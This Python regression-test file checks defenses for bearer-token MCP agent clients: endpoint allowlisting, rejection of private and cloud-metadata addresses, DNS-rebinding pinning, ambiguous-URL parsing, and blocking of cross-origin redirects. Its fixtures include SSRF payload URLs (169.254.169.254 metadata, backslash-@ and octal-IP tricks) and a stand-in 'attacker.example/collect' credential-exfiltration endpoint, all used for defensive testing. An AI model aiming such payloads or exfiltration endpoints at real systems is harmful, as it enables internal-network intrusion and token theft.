"""Regression tests for MCP endpoints configured on bearer-token clients."""
from __future__ import annotations

import asyncio
import datetime
import ipaddress
import os
import socket
import ssl
import tempfile
import unittest
from pathlib import Path
from argparse import Namespace
from unittest.mock import patch

import httpx2
from mcp import Client
from mcp.client.streamable_http import streamable_http_client
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID

from demo.endpoint_validation import (
    EndpointValidationError,
    _make_validated_endpoint,
    resolve_mcp_endpoint,
    validate_mcp_endpoint,
)
from demo.pinned_http_transport import PinnedAddressTransport


def _dns_records(*addresses: str):
    records = []
    for value in addresses:
        family = socket.AF_INET6 if ipaddress.ip_address(value).version == 6 else socket.AF_INET
        records.append((family, socket.SOCK_STREAM, 6, "", (value, 443)))
    return records


def _exception_tree_contains(exception: BaseException, text: str) -> bool:
    if text in str(exception):
        return True
    return any(
        _exception_tree_contains(nested, text)
        for nested in getattr(exception, "exceptions", ())
    )


def _write_test_certificate(directory: str, hostname: str) -> tuple[Path, Path]:
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, hostname)])
    now = datetime.datetime.now(datetime.timezone.utc)
    certificate = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(minutes=1))
        .not_valid_after(now + datetime.timedelta(days=1))
        .add_extension(x509.SubjectAlternativeName([x509.DNSName(hostname)]), critical=False)
        .sign(key, hashes.SHA256())
    )
    certificate_path = Path(directory, "gateway-cert.pem")
    key_path = Path(directory, "gateway-key.pem")
    certificate_path.write_bytes(certificate.public_bytes(serialization.Encoding.PEM))
    key_path.write_bytes(
        key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        )
    )
    return certificate_path, key_path


class TestMcpEndpointValidation(unittest.TestCase):
    def test_loopback_http_is_preserved_only_for_verified_loopback_destinations(self):
        def resolve(host, port, *, type):
            self.assertEqual((host, port, type), ("localhost", 8000, socket.SOCK_STREAM))
            return _dns_records("127.0.0.1", "::1")

        accepted = (
            "http://localhost:8000/mcp",
            "http://127.0.0.1:8000/mcp",
            "http://127.42.0.9:8000/mcp",
            "http://[::1]:8000/mcp",
        )
        for endpoint in accepted:
            with self.subTest(endpoint=endpoint):
                validate_mcp_endpoint(endpoint, resolver=resolve)

        with self.assertRaisesRegex(EndpointValidationError, "loopback"):
            validate_mcp_endpoint(
                "http://localhost:8000/mcp",
                resolver=lambda *_args, **_kwargs: _dns_records("198.51.100.11"),
            )

    def test_remote_https_requires_exact_approved_hostname_and_public_dns_answers(self):
        public_resolver = lambda host, port, **_kwargs: _dns_records("93.184.216.34")
        with self.assertRaisesRegex(EndpointValidationError, "not explicitly trusted"):
            validate_mcp_endpoint("https://untrusted.example.com/mcp", resolver=public_resolver)

        resolved = resolve_mcp_endpoint(
            "https://gateway.example.com/mcp",
            trusted_hosts={"gateway.example.com"},
            resolver=public_resolver,
        )
        self.assertEqual(resolved.addresses, (ipaddress.ip_address("93.184.216.34"),))
        self.assertEqual(
            validate_mcp_endpoint(
                "https://gateway.example.com/mcp",
                trusted_hosts={"gateway.example.com"},
                resolver=public_resolver,
            ),
            "https://gateway.example.com/mcp",
        )

    def test_all_non_public_ipv4_and_ipv6_destinations_are_rejected(self):
        rejected = (
            "https://127.0.0.1/mcp",
            "https://127.0.0.2/mcp",
            "https://[::1]/mcp",
            "https://[::ffff:127.0.0.1]/mcp",
            "https://10.0.0.8/mcp",
            "https://192.168.1.10/mcp",
            "https://172.16.0.1/mcp",
            "https://169.254.169.254/latest/meta-data/",
            "https://[fe80::1]/mcp",
            "https://[fc00::1]/mcp",
            "https://[ff02::1]/mcp",
            "https://[::]/mcp",
            "https://[2001:db8::1]/mcp",
            "https://[2001:20::1]/mcp",
            "https://[64:ff9b::a00:1]/mcp",
            "https://[2002:0a00:0001::1]/mcp",
            "https://203.0.113.20/mcp",
            "https://224.0.0.1/mcp",
            "https://0.0.0.0/mcp",
            "https://240.0.0.1/mcp",
        )
        for endpoint in rejected:
            with self.subTest(endpoint=endpoint), self.assertRaises(EndpointValidationError):
                validate_mcp_endpoint(endpoint, trusted_hosts={endpoint.split("/")[2].strip("[]")})

    def test_dns_failure_and_every_non_public_answer_fail_closed(self):
        endpoint = "https://gateway.example.com/mcp"
        trusted = {"gateway.example.com"}
        for resolver in (
            lambda *_args, **_kwargs: [],
            lambda *_args, **_kwargs: (_ for _ in ()).throw(socket.gaierror("no answer")),
        ):
            with self.subTest(resolver=resolver), self.assertRaises(EndpointValidationError):
                validate_mcp_endpoint(endpoint, trusted_hosts=trusted, resolver=resolver)
        rejected_answers = (
            ("127.0.0.1",), ("::1",), ("10.0.0.8",), ("fc00::1",),
            ("169.254.169.254",), ("fe80::1",), ("224.0.0.1",), ("ff02::1",),
            ("0.0.0.0",), ("::",), ("203.0.113.20",), ("2001:db8::1",),
            ("64:ff9b::a00:1",), ("2002:0a00:0001::1",),
            ("93.184.216.34", "127.0.0.1"),
        )
        for answers in rejected_answers:
            resolver = lambda *_args, _answers=answers, **_kwargs: _dns_records(*_answers)
            with self.subTest(answers=answers), self.assertRaises(EndpointValidationError):
                validate_mcp_endpoint(endpoint, trusted_hosts=trusted, resolver=resolver)

    def test_allowlists_are_validated(self):
        with self.assertRaisesRegex(EndpointValidationError, "invalid hostname"):
            validate_mcp_endpoint(
                "https://gateway.example.com/mcp",
                trusted_hosts={"gateway.example.com/path"},
            )

    def test_dns_answer_change_after_validation_does_not_change_socket_destination(self):
        answers = ["93.184.216.34"]
        resolutions = []

        def resolver(host, port, **kwargs):
            resolutions.append((host, port, kwargs.get("type")))
            return _dns_records(answers[0])

        endpoint = resolve_mcp_endpoint(
            "https://gateway.example.com/mcp",
            trusted_hosts={"gateway.example.com"},
            resolver=resolver,
        )
        answers[0] = "127.0.0.1"  # Simulate rebinding after endpoint validation.
        requests = []

        async def send_request():
            async def capture(request):
                requests.append(request)
                return httpx2.Response(200, request=request, content=b"ok")

            pin = PinnedAddressTransport(endpoint, inner_transport=httpx2.MockTransport(capture))
            async with httpx2.AsyncClient(transport=pin, trust_env=False) as client:
                return await client.get(endpoint.url, headers={"Authorization": "Bearer pin-test"})

        response = asyncio.run(send_request())
        self.assertEqual(response.status_code, 200)
        self.assertEqual(resolutions, [("gateway.example.com", 443, socket.SOCK_STREAM)])
        self.assertEqual(len(requests), 1)
        self.assertEqual(requests[0].url.host, "93.184.216.34")
        self.assertEqual(requests[0].headers["host"], "gateway.example.com")
        self.assertEqual(requests[0].extensions["sni_hostname"], "gateway.example.com")

    def test_pinned_ipv6_destination_keeps_the_validated_hostname(self):
        public_ipv6 = "2606:4700:4700::1111"
        endpoint = resolve_mcp_endpoint(
            "https://gateway.example.com/mcp",
            trusted_hosts={"gateway.example.com"},
            resolver=lambda *_args, **_kwargs: _dns_records(public_ipv6),
        )
        requests = []

        async def send_request():
            async def capture(request):
                requests.append(request)
                return httpx2.Response(200, request=request, content=b"ok")

            pin = PinnedAddressTransport(endpoint, inner_transport=httpx2.MockTransport(capture))
            async with httpx2.AsyncClient(transport=pin, trust_env=False) as client:
                await client.get(endpoint.url)

        asyncio.run(send_request())
        self.assertEqual(requests[0].url.host, public_ipv6)
        self.assertEqual(requests[0].headers["host"], "gateway.example.com")
        self.assertEqual(requests[0].extensions["sni_hostname"], "gateway.example.com")

    def test_real_tls_uses_sni_and_verifies_the_endpoint_hostname(self):
        hostname = "tls.gateway.invalid"

        async def tls_requests():
            with tempfile.TemporaryDirectory() as directory:
                cert_path, key_path = _write_test_certificate(directory, hostname)
                server_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                server_context.load_cert_chain(str(cert_path), str(key_path))
                sni_names = []
                received = []
                server_context.set_servername_callback(
                    lambda _socket, name, _context: sni_names.append(name)
                )

                async def handler(reader, writer):
                    request_line = await reader.readline()
                    headers = {}
                    while True:
                        line = await reader.readline()
                        if line in (b"\r\n", b""):
                            break
                        key, _, value = line.decode("latin-1").partition(":")
                        headers[key.lower()] = value.strip()
                    received.append((request_line, headers))
                    writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok")
                    await writer.drain()
                    writer.close()
                    await writer.wait_closed()

                server = await asyncio.start_server(handler, "127.0.0.1", 0, ssl=server_context)
                port = server.sockets[0].getsockname()[1]
                client_context = ssl.create_default_context(cafile=str(cert_path))
                self.assertTrue(client_context.check_hostname)
                self.assertEqual(client_context.verify_mode, ssl.CERT_REQUIRED)

                def make_test_endpoint(request_hostname):
                    url = f"https://{request_hostname}:{port}/mcp"
                    return _make_validated_endpoint(
                        url,
                        "https",
                        request_hostname,
                        port,
                        (ipaddress.ip_address("127.0.0.1"),),
                    )

                async with server:
                    matching = make_test_endpoint(hostname)
                    inner = httpx2.AsyncHTTPTransport(verify=client_context, trust_env=False)
                    async with httpx2.AsyncClient(
                        transport=PinnedAddressTransport(matching, inner_transport=inner),
                        trust_env=False,
                    ) as client:
                        response = await client.get(f"{matching.url}?session=pin-check")
                        self.assertEqual((response.status_code, response.text), (200, "ok"))

                    mismatch = make_test_endpoint("different.gateway.invalid")
                    inner = httpx2.AsyncHTTPTransport(verify=client_context, trust_env=False)
                    async with httpx2.AsyncClient(
                        transport=PinnedAddressTransport(mismatch, inner_transport=inner),
                        trust_env=False,
                    ) as client:
                        try:
                            await client.get(mismatch.url)
                        except httpx2.ConnectError as exc:
                            hostname_error = exc
                        else:
                            hostname_error = None

                return port, sni_names, received, hostname_error

        port, sni_names, received, hostname_error = asyncio.run(tls_requests())
        self.assertEqual(sni_names, [hostname, "different.gateway.invalid"])
        self.assertEqual(len(received), 1)
        self.assertEqual(received[0][0], b"GET /mcp?session=pin-check HTTP/1.1\r\n")
        self.assertEqual(received[0][1]["host"], f"{hostname}:{port}")
        self.assertIsInstance(hostname_error, httpx2.ConnectError)

    def test_remote_http_unsupported_schemes_and_ambiguous_urls_are_rejected(self):
        rejected = (
            "http://gateway.example.com/mcp",
            "http://2130706433/mcp",
            "http://0177.0.0.1/mcp",
            "ftp://gateway.example.com/mcp",
            "//gateway.example.com/mcp",
            "https://user:password@gateway.example.com/mcp",
            "https://gateway.example.com:/mcp",
            "https://[2001:db8::1/mcp",
            "https://gateway.example.com/mcp?token=x",
            "https://gateway.example.com\\@127.0.0.1/mcp",
            "https://gateway.example.com./mcp",
            " https://gateway.example.com/mcp",
        )
        for endpoint in rejected:
            with self.subTest(endpoint=endpoint), self.assertRaises(EndpointValidationError):
                validate_mcp_endpoint(endpoint)

    def test_both_agents_reject_unapproved_https_before_constructing_http_client(self):
        cases = (
            {
                "AGENTGUARD_MCP_URL": "https://untrusted.example.com/mcp",
                "AGENTGUARD_TRUSTED_MCP_HOSTS": "",
            },
            {
                "AGENTGUARD_MCP_URL": "https://127.0.0.1/mcp",
                "AGENTGUARD_TRUSTED_MCP_HOSTS": "127.0.0.1",
            },
        )
        for case in cases:
            env = {"AGENTGUARD_TOKEN": "test-token", **case}
            with self.subTest(endpoint=case["AGENTGUARD_MCP_URL"]), patch.dict(
                os.environ, env, clear=False
            ):
                with patch("demo.managed_agent.parse_args", return_value=Namespace(limit=10, request_id=None, query="Acme")):
                    with patch("demo.managed_agent.create_pinned_mcp_http_client") as client:
                        self.assertEqual(asyncio.run(self._managed_run()), 2)
                        client.assert_not_called()
                with patch("demo.external_agent.create_pinned_mcp_http_client") as client:
                    self.assertEqual(asyncio.run(self._external_run()), 2)
                    client.assert_not_called()

    def test_pinned_transport_rejects_changed_origin_before_sending_credentials(self):
        endpoint = resolve_mcp_endpoint(
            "https://gateway.example.com/mcp",
            trusted_hosts={"gateway.example.com"},
            resolver=lambda *_args, **_kwargs: _dns_records("93.184.216.34"),
        )
        requests = []

        async def send_out_of_origin_request():
            async def capture(request):
                requests.append(request)
                return httpx2.Response(200, request=request)

            pin = PinnedAddressTransport(endpoint, inner_transport=httpx2.MockTransport(capture))
            async with httpx2.AsyncClient(
                headers={"Authorization": "Bearer origin-guard-test"},
                transport=pin,
                trust_env=False,
            ) as client:
                await client.get("https://attacker.example/collect")

        with self.assertRaisesRegex(httpx2.RequestError, "escaped the validated endpoint origin"):
            asyncio.run(send_out_of_origin_request())
        self.assertEqual(requests, [])

    def test_mcp_sdk_does_not_forward_credentials_to_cross_origin_redirects(self):
        requests = []
        endpoint = _make_validated_endpoint(
            "https://gateway.example.com/mcp",
            "https",
            "gateway.example.com",
            443,
            (ipaddress.ip_address("93.184.216.34"),),
        )

        async def call_redirecting_server():
            async def handler(request):
                requests.append(request)
                return httpx2.Response(
                    307,
                    headers={"Location": "https://attacker.example/collect"},
                    request=request,
                )

            async with httpx2.AsyncClient(
                headers={"Authorization": "Bearer redirect-regression-token"},
                follow_redirects=True,
                trust_env=False,
                transport=PinnedAddressTransport(endpoint, inner_transport=httpx2.MockTransport(handler)),
            ) as http_client:
                transport = streamable_http_client(
                    endpoint.url, http_client=http_client
                )
                async with Client(transport) as client:
                    await client.list_tools()

        with self.assertRaises(ExceptionGroup) as raised:
            asyncio.run(call_redirecting_server())
        self.assertTrue(_exception_tree_contains(raised.exception, "not followed"))
        # The SDK retries protocol negotiation against the configured endpoint,
        # but never sends the bearer or request body to the Location origin.
        self.assertTrue(requests)
        self.assertTrue(all(request.url.host == "93.184.216.34" for request in requests))
        self.assertTrue(all(request.headers.get("host") == "gateway.example.com" for request in requests))
        self.assertTrue(all(request.headers.get("authorization") == "Bearer redirect-regression-token" for request in requests))

    @staticmethod
    async def _managed_run():
        from demo.managed_agent import run

        return await run()

    @staticmethod
    async def _external_run():
        from demo.external_agent import run

        return await run()


if __name__ == "__main__":
    unittest.main()
